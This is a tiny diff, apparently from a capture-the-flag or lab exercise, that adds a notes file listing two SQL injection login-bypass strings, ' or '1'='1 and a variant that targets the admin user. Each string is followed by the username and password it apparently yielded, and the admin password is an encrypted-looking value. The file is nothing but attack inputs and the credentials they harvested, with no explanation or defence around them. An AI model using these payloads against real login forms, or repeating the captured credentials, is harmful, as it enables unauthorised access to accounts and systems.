@@ -1,0 +1,12 @@
+TRY No1:
+
+' or  '1'='1
+
+user1 / TYsgv75zgtq
+
+
+TRY No2:
+
+' or username='admin' or  '1'='1
+
+admin / (:aes 2zqdVabTaTTkDGVPelbZd296VwV5 :)
